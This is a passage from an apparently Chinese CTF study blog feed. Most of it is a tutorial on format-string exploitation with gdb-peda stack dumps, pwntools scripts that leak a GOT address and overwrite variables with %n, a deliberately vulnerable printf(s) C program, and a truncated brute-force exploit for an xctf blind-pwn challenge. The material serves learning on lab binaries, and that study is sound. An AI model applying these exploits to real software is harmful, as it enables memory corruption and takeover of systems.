punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcfbc --<span class="token operator">></span> 0x80484f9 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+115<span class="token operator">></span>:    add    esp,0x10<span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffffcfc0 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffffcfc4 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffffcfc8 --<span class="token operator">></span> 0xf7fcf410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffffcfcc --<span class="token operator">></span> 0x804849d <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+23<span class="token operator">></span>:    add    ebx,0x1b63<span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffcfd4 <span class="token punctuation">(</span><span class="token string">".%08x.%08x"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfd8 <span class="token punctuation">(</span><span class="token string">"x.%08x"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 <span class="token keyword">in</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>   from /lib32/libc.so.6gdb-peda$ </code></pre><p>此时，由于格式化字符串为 %x%x%x，所以，程序 会将栈上的 0xffffcd04 及其之后的数值分别作为第一，第二，第三个参数按照 int 型进行解析，分别输出：</p><pre class=" language-bash"><code class="language-bash">gdb-peda$ cContinuing.ffffcfd0.f7fcf410.0804849d<span class="token punctuation">[</span>Inferior 1 <span class="token punctuation">(</span>process 9574<span class="token punctuation">)</span> exited normally<span class="token punctuation">]</span></code></pre><p>想获取栈变量数值，我们一般用%p代替%08x。</p><p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p><p>可以用%n$x来对应栈中第n+1个参数，因为对于printf函数格式化字符串就是栈中第一个参数，而格式化字符串后面的数据就是该格式化字符串内将被替换的参数</p><p>gdb再次深入：</p><pre class=" language-bash"><code class="language-bash">Starting program: /home/hunter/PWN/formal/wiki/test1 %3<span class="token variable">$x</span><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>EAX: 0x8048593 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">)</span>EBX: 0x804a000 --<span class="token operator">></span> 0x8049f14 --<span class="token operator">></span> 0x1 ECX: 0x1 EDX: 0xf7fb389c --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0xffffd048 --<span class="token operator">></span> 0x0 ESP: 0xffffcfac --<span class="token operator">></span> 0x80484ea <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+100<span class="token operator">></span>:    add    esp,0x20<span class="token punctuation">)</span>EIP: 0xf7e2db60 <span class="token punctuation">(</span><span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f11c79<span class="token punctuation">)</span>EFLAGS: 0x296 <span class="token punctuation">(</span>carry PARITY ADJUST zero SIGN <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0xf7e2db5b <span class="token operator">&lt;</span>fprintf+27<span class="token operator">></span>:    ret       0xf7e2db5c:    xchg   ax,ax   0xf7e2db5e:    xchg   ax,ax<span class="token operator">=</span><span class="token operator">></span> 0xf7e2db60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f11c79   0xf7e2db65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e2db6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:    sub    esp,0xc   0xf7e2db6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e2db73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcfac --<span class="token operator">></span> 0x80484ea <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+100<span class="token operator">></span>:    add    esp,0x20<span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffffcfb0 --<span class="token operator">></span> 0x8048593 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">)</span> //函数参数10008<span class="token operator">|</span> 0xffffcfb4 --<span class="token operator">></span> 0x1    //函数参数20012<span class="token operator">|</span> 0xffffcfb8 <span class="token punctuation">(</span><span class="token string">"\"\"\"\"\377\377\377\377\320\317\377\377\320\317\377\377\020\364\374\367\235\204\004\b%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>    //函数参数30016<span class="token operator">|</span> 0xffffcfbc --<span class="token operator">></span> 0xffffffff  //函数参数4.。。。。0020<span class="token operator">|</span> 0xffffcfc0 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffcfc4 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfc8 --<span class="token operator">></span> 0xf7fcf410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 <span class="token keyword">in</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>   from /lib32/libc.so.6gdb-peda$ 继续：0xf7e2db60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f11c79   0xf7e2db65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e2db6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:    sub    esp,0xc   0xf7e2db6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e2db73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcfbc --<span class="token operator">></span> 0x80484f9 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+115<span class="token operator">></span>:    add    esp,0x10<span class="token punctuation">)</span> //第二次调用，返回地址0004<span class="token operator">|</span> 0xffffcfc0 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>  //函参10008<span class="token operator">|</span> 0xffffcfc4 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>  // 2   （格式化参数1。。。）0012<span class="token operator">|</span> 0xffffcfc8 --<span class="token operator">></span> 0xf7fcf410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span>    //30016<span class="token operator">|</span> 0xffffcfcc --<span class="token operator">></span> 0x804849d <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+23<span class="token operator">></span>:    add    ebx,0x1b63<span class="token punctuation">)</span>   //40020<span class="token operator">|</span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffcfd4 --<span class="token operator">></span> 0x0 0028<span class="token operator">|</span> 0xffffcfd8 --<span class="token operator">></span> 0xf7ffd940 --<span class="token operator">></span> 0x0 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 <span class="token keyword">in</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>   from /lib32/libc.so.6gdb-peda$ 以此判断程序将输出0x804849d：gdb-peda$ cContinuing.804849d<span class="token punctuation">[</span>Inferior 1 <span class="token punctuation">(</span>process 9897<span class="token punctuation">)</span> exited normally<span class="token punctuation">]</span></code></pre><p>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</p><p>小结：</p><pre><code>    利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。    利用 %s 来获取变量所对应地址的内容，只不过有零截断。    利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</code></pre><p>3：泄露任意地址内存<br>有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了</p><p>一般来说我们所读取的变量值都是在栈上的，因为是某个函数的局部变量。</p><p>由于我们可以控制格式化字符串，如果我们知道输出函数调用时我们的格式化字符串是第几个参数就可以构造特定形式来获取某些addr，如：p32（addr）%K$s<br>我们可以用下面的方法确定参数偏移：<br>[tag]%p%p%p%p%p%p…</p><p>如：</p><pre class=" language-bash"><code class="language-bash">AAAA%p%p%p%p%p%p%p%p00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%pAAAA0xff99da800xf7f814100x804849d0x414141410x702570250x702570250x702570250x70257025</code></pre><p>所以得到参数位置是5，是格式化字符串的第4个参数</p><p>现在我们可以来访问某些函数的地址如scanf函数，首先找到其got地址<br>利用pwntools得：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>scanf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__isoc99_scanf'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>scanf_got<span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>scanf_got<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%4$s'</span><span class="token keyword">print</span> payloadgdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>   <span class="token operator">//</span>进一步调试sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"%4$s\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>在脚本启动gdb后先finih直到main函数然后在printf下断点。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">=</span><span class="token operator">></span> 0xf7e25b60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f09c79   0xf7e25b65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e25b6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:    sub    esp,0xc   0xf7e25b6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e25b73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffefdd2c --<span class="token operator">></span> 0x80484ea <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+100<span class="token operator">></span>:    add    esp,0x20<span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffefdd30 --<span class="token operator">></span> 0x8048593 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffefdd34 --<span class="token operator">></span> 0x1 0012<span class="token operator">|</span> 0xffefdd38 <span class="token punctuation">(</span><span class="token string">"\"\"\"\"\377\377\377\377P\335\357\377P\335\357\377\020t\374\367\235\204\004\b\024\240\004\b%4<span class="token variable">$s</span>"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffefdd3c --<span class="token operator">></span> 0xffffffff 0020<span class="token operator">|</span> 0xffefdd40 --<span class="token operator">></span> 0xffefdd50 --<span class="token operator">></span> 0x804a014 --<span class="token operator">></span> 0xf7e38410 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__isoc99_scanf<span class="token operator">></span>:    push   ebp<span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffefdd44 --<span class="token operator">></span> 0xffefdd50 --<span class="token operator">></span> 0x804a014 --<span class="token operator">></span> 0xf7e38410 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__isoc99_scanf<span class="token operator">></span>:    push   ebp<span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffefdd48 --<span class="token operator">></span> 0xf7fc7410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e25b60 <span class="token keyword">in</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>   from /lib32/libc.so.6gdb-peda$ 可以看到第4个参数确实是scanf的在libc库中的地址在调试结束后的terminal可以得到scanf的地址：0x804a014\x14\x04%4<span class="token variable">$s</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> running <span class="token keyword">in</span> new terminal: /usr/bin/gdb -q  <span class="token string">"./test1"</span> 11351 -x <span class="token string">"/tmp/pwn7ki8h7.gdb"</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> debugger: Done0xf7d5e410<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'./test1'</span> stopped with <span class="token keyword">exit</span> code 0 <span class="token punctuation">(</span>pid 11351<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre><p>有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字(32位4，64位8）长整数倍的地址处，一般来说，类似于下面的这个样子。<br>[padding][addr][padding]</p><p>4：内存覆盖<br>只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值：%n,<br>%n不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</p><p>程序：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">789</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified c."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified a for a small number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified b for a big number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>基本构造格式如下：<br>…[overwrite addr]….%[overwrite offset]$n<br>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数<br>步骤：<br>    确定覆盖地址<br>    确定相对偏移<br>    进行覆盖</p><p>确定覆盖地址：首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。</p><p>确定相对偏移：其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()<br>hunter@hunter:~/PWN/formal/wiki$ ./test2<br>0xffebe8ac<br>AAAA%p%p%p%p%p%p%p%p%p<br>AAAA0xffebe8480xf7ef14100x80484bd(nil)0x10x414141410x702570250x702570250x70257025<br>所以是第7 个参数  =》  n为6</p><p>进行覆盖：<br>将c的地址放在n=6，然后利用%n来修改c的值<br>[addr of c]%012d%6$n    //addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。</p><p><strong>注意：如果地址没有在或者不能放在第一个位置时，要注意我们的地址作为printf的参数是第几个</strong><br><img src="https://s1.ax1x.com/2020/07/05/USf2tO.png" alt=""></p><p>Exp：</p><pre class=" language-python"><code class="language-python">    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'test2'</span><span class="token punctuation">)</span>    c_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#drop ：是否保留</span>    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span>    payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%012d'</span> <span class="token operator">+</span> <span class="token string">'%6$n'</span>    <span class="token keyword">print</span> payload    <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>覆盖小数字：<br>下面的问题是将a改为2  因为a是全局变量，在data段地址可从ida获取<br>这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。  （或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。）</p><p>我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是：aa%k$naa  刚好占8字节所以我们的地址被挤到第n=8个参数</p><p>利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。</p><p>.data:0804A024                 public a<br>.data:0804A024 a               dd 7Bh</p><p>故而我们可以构造如下的利用代码</p><pre class=" language-python"><code class="language-python">    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'test2'</span><span class="token punctuation">)</span>    a_addr <span class="token operator">=</span> <span class="token number">0x0804A024</span>    payload <span class="token operator">=</span> <span class="token string">'aa%8$naa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>a_addr<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>其实，这里我们需要掌握的小技巧就是，我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。</p><p>覆盖大数字<br>我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12</p><p>首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804A028。</p><p>.data:0804A028                 public b<br>.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r</p><p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p><p>0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12</p><p>这里将构造一个推算代码：（本人不懂）</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>    <span class="token keyword">return</span> fmtstr<span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    prev <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">return</span> payloadpayload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span></code></pre><pre><code>offset 表示要覆盖的地址最初的偏移size 表示机器字长addr 表示将要覆盖的地址。target 表示我们要覆盖为的目的变量值。</code></pre><p>这其实就是pwntools的一个模块：当要写入很大的数时可以用pwntools的fmtstr模块：我们希望向0x08048000写入值0x10203040，在pwntools里，我们可以用命令fmtstr_payload。<br>payload = fmtstr_payload(6,{0x08048000:0x10203040}) // 即可 ， 6是偏移量。</p><p>详情:<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf进阶-pwn-warmup</title>
      <link href="/2020/05/16/xctf-jin-jie-pwn-warmup/"/>
      <url>/2020/05/16/xctf-jin-jie-pwn-warmup/</url>
      
        <content type="html"><![CDATA[<p>这个提没有附件，被称为盲打，blind pwn<br><img src="https://s1.ax1x.com/2020/05/23/YjvFy9.png" alt=""></p><p>黑箱测试之类的。</p><p>linux连接尝试：<br><img src="https://s1.ax1x.com/2020/05/23/YjviQJ.png" alt=""></p><p>因为没有关键提示，可以从溢出方面下手，这个地址很可能就是后门。</p><p>exp爆破：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>addr <span class="token operator">=</span> <span class="token number">0x40060d</span>    <span class="token comment" spellcheck="true">#地址可能是p32 也可能是p64</span><span class="token keyword">def</span> <span class="token function">fuzz</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> num<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#爆破函数 , flag表示有3种可能：p32发送后门，p64发送后门，无效后门。</span>    payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> num    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token 